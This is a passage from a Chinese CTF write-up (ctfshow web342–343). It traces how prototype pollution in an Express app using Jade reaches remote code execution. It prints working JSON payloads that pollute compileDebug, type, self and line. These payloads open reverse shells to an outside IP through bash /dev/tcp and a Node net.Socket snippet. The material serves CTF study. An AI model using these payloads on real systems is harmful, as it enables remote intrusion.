对象里的值！</p><p>其实原型链污染的利用核心就是：访问对象的属性/值为 undefined 才行，不然我们污染 <code>Object</code> 对象就没有意义了。</p><p>现在看这篇文章就能看懂了，而且发现总结的非常好。。</p><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><p>好的，在同一频道上了。</p><p>先梳理上面分析的函数调用栈，我们断点入口在 <code>routes/index.js</code> <code>res.render(&#39;index&#39;,&#123;title:&#39;ctfshow&#39;&#125;);</code> ，调用栈如下</p><ol><li><p>routes/index.js :: res.render</p></li><li><p>jade/lib/index.js :: exports.__express</p></li><li><p>jade/lib/index.js :: exports.renderFile</p></li><li><ol><li>jade/lib/index.js :: handleTemplateCache</li></ol></li><li><p>jade/lib/index.js :: exports.compile</p></li><li><ol><li>jade/lib/index.js :: parse -&gt; compiler.compile();</li></ol></li><li><ol><li><ol><li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li><li>jade/lib/compiler.js :: this.visit</li><li>jade/lib/compiler.js :: this.buf.push</li></ol></li></ol></li><li><ol><li>jade/lib/index.js :: parse -&gt; options.self</li><li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li><li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li></ol></li></ol><p>至 4. a. iii. 这部分调用栈用下图，4. b. c. d. 的在上面 debug 也有提及，因此调用栈这部分问题不大</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619877575256-25b06a25-1dc6-494a-a348-a8929ec5b81e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619877575256-25b06a25-1dc6-494a-a348-a8929ec5b81e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>问题有 3</p><ol><li><code>visit</code> 方法中 <code>this.debug=true</code> ，不然 <code>this.buf.push</code> 调用不了</li><li>在上面提到的：<code>node.line</code> 在某处为 <code>undefined</code> 才行，不然我们污染的 <code>Object</code> 对象就没意义</li><li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li></ol><p>第 1 个问题容易解决，因为在 Jade 入口 <code>exports.__express</code> ，我们上面 deubg 分析时也看到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.__express = <span class="function"><span class="keyword">function</span> (<span class="params">path, options, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (options.compileDebug == <span class="literal">undefined</span> &amp;&amp; process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    options.compileDebug = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exports</span>.renderFile(path, options, fn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式（经分析，<code>this.debug</code> 获取的就是这里的 debug 值），当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code>  导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置，2333。</p><p>这里因 <code>utils.copy(user.userinfo,req.body);</code> 与 web341一样，<code>userinfo.__proto__.__proto__</code> 才是 <code>Object</code> 对象的原型，所以要套两层。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>先打一下</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116128748-ac570d67-cac5-468c-a273-a43812c73435.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116128748-ac570d67-cac5-468c-a273-a43812c73435.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>第 3 个问题提前出现了，要先解决这个问题，保证代码能够执行到渲染阶段</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116131082-927af231-aa69-4d7f-a1fa-d1bd6eb1d180.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116131082-927af231-aa69-4d7f-a1fa-d1bd6eb1d180.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>和先知文章里不同，这里报错有点不一样，先跟进 <code>Compiler.visitNode</code> 225行看一下</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116541915-a5c6af43-8a65-453d-9995-a31a66b54457.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116541915-a5c6af43-8a65-453d-9995-a31a66b54457.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>拼接一下，发现没有这个方法</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116560928-00141f65-8124-4d8b-b9b3-4f70b435b057.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116560928-00141f65-8124-4d8b-b9b3-4f70b435b057.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>在遍历AST树时，通常是通过 <code>&quot;visit&quot; + 节点类型</code> 来遍历所有节点的，观察错误调用栈也知，比如 <code>visitBlock</code>，就是访问 <code>Block</code> 节点。那 <code>Block</code> 可用，我们就污染一下 <code>type</code> 就好了，当它当前上下文找不到就去找 <code>Object</code> 了。</p><p>当然选取时，最好是选的节点附带的上下文信息进入后，啥事也不会做的，不然也有走向奇奇怪怪的逻辑，先来看看 Block 节点。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117442355-58168bea-2ae8-40a5-a38f-9f38e145a384.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117442355-58168bea-2ae8-40a5-a38f-9f38e145a384.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>这里加上这部分逻辑，来看看我们故意伪造 Block 节点会发生什么</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.type == <span class="literal">undefined</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>[<span class="string">&#x27;visit&#x27;</span> + <span class="string">&#x27;Block&#x27;</span>](node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117969224-9896faed-6f7b-49dd-a4b5-63c9d642847f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117969224-9896faed-6f7b-49dd-a4b5-63c9d642847f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>这里 <code>block.nodes</code> 为 <code>undefined</code> ，然后 <code>undefined.length</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118021804-559e7fb3-5448-494e-a38d-743f1c1e2dcb.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118021804-559e7fb3-5448-494e-a38d-743f1c1e2dcb.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>明显，这样访问会报错，导致进入其他错误，然后 <code>jade</code> 没有对这块异常进行处理。</p><p>也就是说，如果 <code>vist</code> 的节点不是这种 <code>block.子属性.孙子属性</code> 问题应该不大。顶多一个 <code>undefined</code> 然后直接结束啥的，这里试试 <code>visitCode</code> ，</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118172963-52ab2681-b97c-4b38-82f3-bf3255b5820d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118172963-52ab2681-b97c-4b38-82f3-bf3255b5820d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>正常走到后面，没有报错，期间只触发了 <code>this.buf.push(code.val)</code> ，问题应该不大。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118198085-93803b1d-f797-4109-89ab-4e61e907c305.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118198085-93803b1d-f797-4109-89ab-4e61e907c305.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>尝试污染 <code>type</code> 为 <code>Code</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118330281-d959454b-3c39-483c-9e4c-f032049d3fed.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118330281-d959454b-3c39-483c-9e4c-f032049d3fed.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>好耶，像是解决了，因为这个报错和先知文章报错一致。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118350820-00c93106-f0ac-4934-8b91-5053218496d9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118350820-00c93106-f0ac-4934-8b91-5053218496d9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>尝试解决这个报错，因为看错误调这里好像还没到渲染成功的地方。</p><p>分析这个错误栈，可以看到前 4 点还是属于 <code>jade</code> 范畴。先跟进 <code>jade</code> 模块最后报错的地方，即 <code>jade/libindex.js</code> 149行的 <code>parse</code> 方法，</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118955171-5adf4d74-799a-49da-b808-a290a2b432f0.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118955171-5adf4d74-799a-49da-b808-a290a2b432f0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发现，程序已经走完刚刚AST遍历部分了，已经差不多要返回了。</p><p>感觉只要避免进入149行的 <code>addWith</code> 方法，就可以渲染成功了！</p><p>然后进入149行的 <code>addWith</code> 方法是满足147行的 <code>options.self</code> 值为 False，尝试下看看这个 <code>options.self</code> 默认是不是 <code>undefined</code>，如果是就可以污染了。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119251617-e365f480-5242-4820-b69e-ce699e0bb915.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119251617-e365f480-5242-4820-b69e-ce699e0bb915.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>nice，就是 <code>undefined</code> ，尝试污染 <code>self</code> 为 <code>true</code> ，<code>1</code> 也可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119423983-2f7f92e0-cf5c-4e61-974c-a7b07af0edd4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119423983-2f7f92e0-cf5c-4e61-974c-a7b07af0edd4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119438729-f49f92be-360a-46f7-9d70-e8299187bcaf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119438729-f49f92be-360a-46f7-9d70-e8299187bcaf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>！！！终于走到渲染这一步了！</p><p>看到 <code>undefined</code> 好说，污染就完事了 （</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;tari&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>到这 index 的页面渲染就没啥问题了，到 第 2 个问题，<code>node.line</code> 在某处为 <code>undefined</code> 才行，不然我们污染的 <code>Object</code> 对象就没意义</p><p>这里如果一步一步动态调试会比较麻烦，直接注入测试即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619878355583-fa6a99d2-3f52-4621-8f22-e9e41af3f303.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619878355583-fa6a99d2-3f52-4621-8f22-e9e41af3f303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"> </p><p>发现都 <code>node</code> 为 <code>Block</code> 的时候 <code>line</code> 是不存在的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619882616884-efc76041-dad6-40e9-b868-f51b2f5347c0.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619882616884-efc76041-dad6-40e9-b868-f51b2f5347c0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>理论上，只要覆盖了 <code>node.line</code> 即可达到代码执行的目的。</p><p>然后拼接上面避免报错的参数，得到</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;tari&quot;</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/2233&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>反弹 Shell</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134887089-f7c6069a-6fb6-4cd2-b050-9e458e569844.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134887089-f7c6069a-6fb6-4cd2-b050-9e458e569844.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>再 POST一次，发送的数据包不用变</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134804938-2c7f05ad-0f34-478e-89d9-03f6c739b1ec.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134804938-2c7f05ad-0f34-478e-89d9-03f6c739b1ec.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>不就少了个 <code>message</code>，那我污染你呗，，然后 <code>message</code> 后又说少了 <code>error</code> 继续污染，然后 <code>error</code> 是一个对象，就需要弄个 <code>json</code> 格式数据啦。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135004859-7389888a-d8f0-4621-a7d6-9bf2921c0ebe.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135004859-7389888a-d8f0-4621-a7d6-9bf2921c0ebe.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>emmm，到这，其实一开始就犯了个很蠢的错。。。其实一开始就应该污染 <code>line</code> 先的，然后在试 <code>compileDebug</code>、<code>type</code>、<code>self</code>，蠢哭了，，因为，如果不污染 line 先的话，不能保证在 line 正确的情况下试其他的，就会导致，，其他对了，加上 <code>line</code> 就错了。。</p><p>其实这里，压根就不用污染 <code>title</code>，如果是 先污染 <code>line</code>，然后到 <code>compileDebug</code>、<code>type</code>、<code>self</code> 会发现，到 <code>self</code> 这就可以成功反弹 shell 了，人都傻了。。。</p><p>最终 EXP</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135415450-1fa60022-1025-4b8b-be41-7b50e9b9063d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135415450-1fa60022-1025-4b8b-be41-7b50e9b9063d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>不用变，在POST一次即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135362376-428be533-bf5a-467c-b3b3-7fced3de7f4c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135362376-428be533-bf5a-467c-b3b3-7fced3de7f4c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>原本想用原生Socket的，不知道为啥老是报错，奇怪，，难道闭合不了？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620141995611-25ddf749-f50f-40f4-ba96-34d74fe24347.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620141995611-25ddf749-f50f-40f4-ba96-34d74fe24347.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web343-原型链污染"><a href="#web343-原型链污染" class="headerlink" title="web343 原型链污染 +++++"></a>web343 原型链污染 +++++</h2><p>说有过滤，但 web342一样的 EXP 也可以打，反弹shell后看源码才发现确实多了点东西</p><p>login.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 